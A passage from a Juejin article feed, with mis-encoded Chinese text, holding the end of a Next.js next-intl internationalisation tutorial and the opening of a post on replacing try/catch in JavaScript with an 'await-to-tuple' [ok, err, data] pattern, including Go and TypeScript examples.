<li>TypeScript æ”¯æŒ</li>
<li>ç¼–è¯‘æ—¶æ£€æŸ¥ç¿»è¯‘é”®</li>
<li>å‡å°‘è¿è¡Œæ—¶é”™è¯¯</li>
</ul>
<h3 data-id="heading-19">5. UI ç»„ä»¶å›½é™…åŒ–</h3>
<ul>
<li>Ant Design ç»„ä»¶è‡ªåŠ¨é€‚é…è¯­è¨€</li>
<li>æ—¥æœŸã€è¡¨å•ã€åˆ†é¡µç­‰ç»„ä»¶æ–‡æœ¬è‡ªåŠ¨ç¿»è¯‘</li>
</ul>
<h2 data-id="heading-20">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-21">1. ç¿»è¯‘æ–‡ä»¶ç»„ç»‡</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"common"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// å…¨å±€é€šç”¨ç¿»è¯‘</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// é¦–é¡µä¸“ç”¨ç¿»è¯‘</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"about"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// å…³äºé¡µä¸“ç”¨ç¿»è¯‘</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-22">2. ä½¿ç”¨å‘½åç©ºé—´</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// é¿å…ç¿»è¯‘é”®å†²çª</span>
<span class="hljs-keyword">const</span> t = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'home'</span>);
<span class="hljs-title function_">t</span>(<span class="hljs-string">'title'</span>)  <span class="hljs-comment">// home.title</span>

<span class="hljs-keyword">const</span> tc = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'common'</span>);
<span class="hljs-title function_">tc</span>(<span class="hljs-string">'title'</span>)  <span class="hljs-comment">// common.title</span>
</code></pre>
<h3 data-id="heading-23">3. è¯­è¨€åˆ‡æ¢ä¿æŒè·¯å¾„</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åœ¨ä»»ä½•é¡µé¢åˆ‡æ¢è¯­è¨€ï¼Œä¿æŒå½“å‰è·¯å¾„</span>
&lt;<span class="hljs-title class_">Link</span> href={pathname} locale=<span class="hljs-string">"zh-CN"</span>&gt;ä¸­æ–‡&lt;/<span class="hljs-title class_">Link</span>&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">{pathname}</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">"en-US"</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-24">4. å¤„ç†ç¼ºå¤±ç¿»è¯‘</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// request.ts ä¸­è®¾ç½®å›é€€</span>
<span class="hljs-keyword">return</span> {
  locale,
  <span class="hljs-attr">messages</span>: (<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`../../messages/<span class="hljs-subst">${locale}</span>.json`</span>)).<span class="hljs-property">default</span>,
  <span class="hljs-attr">defaultTranslationValues</span>: {
    <span class="hljs-comment">// è®¾ç½®é»˜è®¤å€¼</span>
  }
};
</code></pre>
<h2 data-id="heading-25">å¸¸è§é—®é¢˜</h2>
<h3 data-id="heading-26">Q1: å¦‚ä½•æ·»åŠ æ–°è¯­è¨€ï¼Ÿ</h3>
<ol>
<li>åœ¨ <code>routing.ts</code> ä¸­æ·»åŠ è¯­è¨€ä»£ç </li>
<li>åˆ›å»ºå¯¹åº”çš„ç¿»è¯‘æ–‡ä»¶ <code>messages/ja-JP.json</code></li>
<li>åœ¨ <code>AntdProvider.tsx</code> ä¸­æ·»åŠ  Ant Design è¯­è¨€åŒ…</li>
<li>æ›´æ–° middleware matcher</li>
</ol>
<h3 data-id="heading-27">Q2: å¦‚ä½•è®©æ‰€æœ‰è¯­è¨€éƒ½æ˜¾ç¤ºå‰ç¼€ï¼Ÿ</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// routing.ts</span>
<span class="hljs-attr">localePrefix</span>: <span class="hljs-string">'always'</span>  <span class="hljs-comment">// æ”¹ä¸º always</span>
</code></pre>
<h3 data-id="heading-28">Q3: å¦‚ä½•åœ¨æœåŠ¡ç«¯ç»„ä»¶ä¸­ä½¿ç”¨ç¿»è¯‘ï¼Ÿ</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { getTranslations } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> t = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getTranslations</span>(<span class="hljs-string">'home'</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{t('title')}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;
}
</code></pre>
<h3 data-id="heading-29">Q4: å¦‚ä½•æ ¹æ®ç”¨æˆ·æµè§ˆå™¨è¯­è¨€è‡ªåŠ¨è·³è½¬ï¼Ÿ</h3>
<p>middleware ä¼šè‡ªåŠ¨å¤„ç†ï¼ŒåŸºäº <code>Accept-Language</code> è¯·æ±‚å¤´ã€‚</p>
<h2 data-id="heading-30">æ€»ç»“</h2>
<p>è¿™å¥—æ–¹æ¡ˆå®ç°äº†ï¼š</p>
<ul>
<li>å®Œæ•´çš„è·¯ç”±å›½é™…åŒ–</li>
<li>æœåŠ¡ç«¯æ¸²æŸ“æ”¯æŒ</li>
<li>UI ç»„ä»¶åº“å›½é™…åŒ–</li>
<li>ç±»å‹å®‰å…¨</li>
<li>SEO å‹å¥½</li>
<li>æ€§èƒ½ä¼˜åŒ–</li>
</ul>
<p>é€‚ç”¨äºéœ€è¦å¤šè¯­è¨€æ”¯æŒçš„ Next.js é¡¹ç›®ï¼Œç‰¹åˆ«æ˜¯é¢å‘å›½é™…ç”¨æˆ·çš„å…¬å¼€ç½‘ç«™ã€‚</p>
<h2 data-id="heading-31">å‚è€ƒèµ„æº</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnext-intl-docs.vercel.app%2F" target="_blank" title="https://next-intl-docs.vercel.app/" ref="nofollow noopener noreferrer">next-intl å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fbuilding-your-application%2Frouting%2Finternationalization" target="_blank" title="https://nextjs.org/docs/app/building-your-application/routing/internationalization" ref="nofollow noopener noreferrer">Next.js å›½é™…åŒ–æŒ‡å—</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fant.design%2Fdocs%2Freact%2Fi18n" target="_blank" title="https://ant.design/docs/react/i18n" ref="nofollow noopener noreferrer">Ant Design å›½é™…åŒ–</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ« try/catch åœ°ç‹±ï¼šç”¨ä¸‰å…ƒç»„é‡æ–°å®šä¹‰ JavaScript é”™è¯¯å¤„ç†]]></title>    <link>https://juejin.cn/post/7583970267133378566</link>    <guid>https://juejin.cn/post/7583970267133378566</guid>    <pubDate>2025-12-16T03:43:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583970267133378566" data-draft-id="7583980250734002239" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ« try/catch åœ°ç‹±ï¼šç”¨ä¸‰å…ƒç»„é‡æ–°å®šä¹‰ JavaScript é”™è¯¯å¤„ç†"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-12-16T03:43:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoderHing"/> <meta itemprop="url" content="https://juejin.cn/user/1992782705853159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ« try/catch åœ°ç‹±ï¼šç”¨ä¸‰å…ƒç»„é‡æ–°å®šä¹‰ JavaScript é”™è¯¯å¤„ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1992782705853159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoderHing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:43:53.000Z" title="Tue Dec 16 2025 03:43:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‘Šåˆ« try/catch åœ°ç‹±ï¼šç”¨ä¸‰å…ƒç»„é‡æ–°å®šä¹‰ JavaScript é”™è¯¯å¤„ç†</h2>
<blockquote>
<p>å†™äº†äº”å¹´å‰ç«¯ï¼Œæˆ‘ç»ˆäºå—å¤Ÿäº† try/catchã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ä¸ªçœŸå®çš„åœºæ™¯</h3>
<p>ä¸Šå‘¨é‡æ„ä¸€ä¸ªè€é¡¹ç›®ï¼Œæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œ200 è¡Œä»£ç é‡Œæœ‰ 47 è¡Œæ˜¯ try/catchã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadDashboard</span>(<span class="hljs-params">userId</span>) {
  <span class="hljs-keyword">let</span> user;
  <span class="hljs-keyword">try</span> {
    user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(userId);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–ç”¨æˆ·å¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> posts;
  <span class="hljs-keyword">try</span> {
    posts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchPosts</span>(user.<span class="hljs-property">id</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–æ–‡ç« å¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> comments;
  <span class="hljs-keyword">try</span> {
    comments = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchComments</span>(posts[<span class="hljs-number">0</span>].<span class="hljs-property">id</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–è¯„è®ºå¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-title function_">render</span>(user, posts, comments);
}
</code></pre>
<p>çœ‹ç€è¿™å¨ä»£ç ï¼Œæˆ‘é—®è‡ªå·±ï¼š<strong>è¿™çœŸçš„æ˜¯ 2024 å¹´è¯¥æœ‰çš„å†™æ³•å—ï¼Ÿ</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ğŸ˜µ å…¸å‹çš„ try/catch åœ°ç‹±</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processOrder</span>(<span class="hljs-params">orderId</span>) {
  <span class="hljs-keyword">let</span> order;
  <span class="hljs-keyword">try</span> {
    order = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchOrder</span>(orderId);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–è®¢å•å¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> user;
  <span class="hljs-keyword">try</span> {
    user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(order.<span class="hljs-property">userId</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–ç”¨æˆ·å¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> payment;
  <span class="hljs-keyword">try</span> {
    payment = <span class="hljs-keyword">await</span> <span class="hljs-title function_">processPayment</span>(order, user);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ”¯ä»˜å¤„ç†å¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> shipping;
  <span class="hljs-keyword">try</span> {
    shipping = <span class="hljs-keyword">await</span> <span class="hljs-title function_">createShipping</span>(order, user);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åˆ›å»ºç‰©æµå¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> notification;
  <span class="hljs-keyword">try</span> {
    notification = <span class="hljs-keyword">await</span> <span class="hljs-title function_">sendNotification</span>(user, order);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å‘é€é€šçŸ¥å¤±è´¥'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">return</span> { order, payment, shipping, notification };
}
<span class="hljs-comment">// 50+ è¡Œä»£ç ï¼ŒçœŸæ­£çš„ä¸šåŠ¡é€»è¾‘åªæœ‰ 5 è¡Œ</span>
</code></pre>
<h3 data-id="heading-2">é—®é¢˜å‡ºåœ¨å“ªï¼Ÿ</h3>
<p>try/catch æœ¬èº«æ²¡é”™ï¼Œä½†å®ƒæœ‰å‡ ä¸ªè®©äººéš¾å—çš„åœ°æ–¹ï¼š</p>
<p><strong>1. æ‰“æ–­æ€ç»´æµ</strong></p>
<p>æ­£å¸¸é€»è¾‘å’Œé”™è¯¯å¤„ç†äº¤ç»‡åœ¨ä¸€èµ·ï¼Œè¯»ä»£ç æ—¶è¦ä¸æ–­åˆ‡æ¢ä¸Šä¸‹æ–‡ã€‚</p>
<p><strong>2. å˜é‡ä½œç”¨åŸŸé—®é¢˜</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> data;
<span class="hljs-keyword">try</span> {
  data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>();
} <span class="hljs-keyword">catch</span> (e) {
  <span class="hljs-comment">// ...</span>
}
<span class="hljs-comment">// data å¯èƒ½æ˜¯ undefinedï¼ŒTypeScript ä¹Ÿå¸®ä¸äº†ä½ </span>
</code></pre>
<p><strong>3. æ— æ³•ä¼˜é›…ç»„åˆ</strong></p>
<p>æƒ³æŠŠå¤šä¸ªå¼‚æ­¥æ“ä½œä¸²èµ·æ¥ï¼Ÿè¦ä¹ˆåµŒå¥—ï¼Œè¦ä¹ˆä¸€å †ä¸´æ—¶å˜é‡ã€‚</p>
<p><strong>4. é”™è¯¯ç±»å‹ä¸¢å¤±</strong></p>
<p>catch é‡Œçš„ <code>e</code> æ˜¯ <code>unknown</code>ï¼Œæ¯æ¬¡éƒ½è¦æ‰‹åŠ¨åˆ¤æ–­ç±»å‹ã€‚</p>
<h3 data-id="heading-3">Go è¯­è¨€ç»™çš„å¯å‘</h3>
<p>Go ç¨‹åºå‘˜å¤„ç†é”™è¯¯çš„æ–¹å¼å¾ˆä¸ä¸€æ ·ï¼š</p>
<pre><code class="hljs language-go" lang="go">user, err := fetchUser(id)
<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
    <span class="hljs-keyword">return</span> err
}
</code></pre>
<p>é”™è¯¯ä¸æ˜¯è¢«"æŠ›å‡º"çš„ï¼Œè€Œæ˜¯ä½œä¸ºè¿”å›å€¼çš„ä¸€éƒ¨åˆ†ã€‚è¿™ç§æ–¹å¼æœ‰ä¸ªå¥½å¤„ï¼š<strong>é”™è¯¯å¤„ç†å˜æˆäº†æ•°æ®æµçš„ä¸€éƒ¨åˆ†</strong>ï¼Œè€Œä¸æ˜¯æ§åˆ¶æµçš„ä¸­æ–­ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// âœ… Go é£æ ¼ï¼šé”™è¯¯æ˜¯å€¼ï¼Œä¸æ˜¯å¼‚å¸¸</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processOrder</span><span class="hljs-params">(orderId <span class="hljs-type">string</span>)</span></span> (*Result, <span class="hljs-type">error</span>) {
    order, err := fetchOrder(orderId)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"è·å–è®¢å•å¤±è´¥: %w"</span>, err)
    }

    user, err := fetchUser(order.UserId)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"è·å–ç”¨æˆ·å¤±è´¥: %w"</span>, err)
    }

    payment, err := processPayment(order, user)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"æ”¯ä»˜å¤„ç†å¤±è´¥: %w"</span>, err)
    }

    <span class="hljs-keyword">return</span> &amp;Result{Order: order, User: user, Payment: payment}, <span class="hljs-literal">nil</span>
}
<span class="hljs-comment">// é€»è¾‘æ¸…æ™°ï¼Œé”™è¯¯å¤„ç†ç´§è·Ÿè°ƒç”¨ï¼Œä¸€ç›®äº†ç„¶</span>
</code></pre>
<h3 data-id="heading-4">æŠŠè¿™ä¸ªæ€è·¯æ¬åˆ° JavaScript</h3>
<p>æˆ‘å†™äº†ä¸€ä¸ªå°å·¥å…·åº“ <code>await-to-tuple</code>ï¼Œæ ¸å¿ƒæ€æƒ³å¾ˆç®€å•ï¼š</p>
<p><strong>æŠŠ Promise çš„ç»“æœåŒ…è£…æˆ <code>[ok, error, data]</code> ä¸‰å…ƒç»„ã€‚</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-keyword">const</span> [ok, err, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(id));

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–ç”¨æˆ·å¤±è´¥:'</span>, err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>); <span class="hljs-comment">// TypeScript çŸ¥é“è¿™é‡Œ user ä¸€å®šæœ‰å€¼</span>
</code></pre>
<h4 data-id="heading-5">ä¸ºä»€ä¹ˆæ˜¯ä¸‰å…ƒç»„ï¼Ÿ</h4>
<p>ä½ å¯èƒ½è§è¿‡ <code>await-to-js</code> è¿™ä¸ªåº“ï¼Œå®ƒè¿”å› <code>[err, data]</code>ã€‚ä½†è¿™æœ‰ä¸ªé—®é¢˜ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>());

<span class="hljs-comment">// å¦‚æœ data æœ¬èº«å°±æ˜¯ undefined æˆ– null å‘¢ï¼Ÿ</span>
<span class="hljs-comment">// ä½ åˆ†ä¸æ¸…æ˜¯"æˆåŠŸä½†å€¼ä¸ºç©º"è¿˜æ˜¯"å¤±è´¥äº†"</span>
</code></pre>
<p>ä¸‰å…ƒç»„é€šè¿‡ç¬¬ä¸€ä¸ªå¸ƒå°”å€¼ <code>ok</code> æ˜ç¡®åŒºåˆ†æˆåŠŸå’Œå¤±è´¥ï¼š</p>























<table><thead><tr><th>ok</th><th>err</th><th>data</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>true</td><td>null</td><td>å€¼</td><td>æˆåŠŸ</td></tr><tr><td>false</td><td>Error</td><td>null</td><td>å¤±è´¥</td></tr></tbody></table>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ äºŒå…ƒç»„çš„é—®é¢˜ï¼šawait-to-js é£æ ¼</span>
<span class="hljs-keyword">const</span> [err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>());
<span class="hljs-keyword">if</span> (err) { <span class="hljs-comment">/* å¤„ç†é”™è¯¯ */</span> }
<span class="hljs-comment">// é—®é¢˜ï¼šå¦‚æœ API è¿”å› null æˆ– undefined æ€ä¹ˆåŠï¼Ÿ</span>
<span class="hljs-comment">// data ä¸ºç©ºåˆ°åº•æ˜¯"æˆåŠŸä½†å€¼ä¸ºç©º"è¿˜æ˜¯"å¤±è´¥äº†"ï¼Ÿ</span>

<span class="hljs-comment">// âœ… ä¸‰å…ƒç»„çš„ä¼˜åŠ¿ï¼šawait-to-tuple é£æ ¼</span>
<span class="hljs-keyword">const</span> [ok, err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>());
<span class="hljs-keyword">if</span> (!ok) { <span class="hljs-comment">/* ä¸€å®šæ˜¯å¤±è´¥ */</span> }
<span class="hljs-comment">// ok æ˜ç¡®å‘Šè¯‰ä½ æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œä¸å­˜åœ¨æ­§ä¹‰</span>

<span class="hljs-comment">// å¯¹æ¯”è¡¨ï¼š</span>
<span class="hljs-comment">// | ok    | err   | data | å«ä¹‰           |</span>
<span class="hljs-comment">// |-------|-------|------|----------------|</span>
<span class="hljs-comment">// | true  | null  | å€¼   | æˆåŠŸï¼Œæœ‰æ•°æ®   |</span>
<span class="hljs-comment">// | true  | null  | null | æˆåŠŸï¼Œå€¼ä¸ºç©º   |</span>
<span class="hljs-comment">// | false | Error | null | å¤±è´¥           |</span>
</code></pre>
<h3 data-id="heading-6">å®é™…æ•ˆæœ</h3>
<p>è¿˜è®°å¾—å¼€å¤´é‚£ 47 è¡Œä»£ç å—ï¼Ÿç”¨ <code>await-to-tuple</code> é‡å†™ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadDashboard</span>(<span class="hljs-params">userId: <span class="hljs-built_in">string</span></span>) {
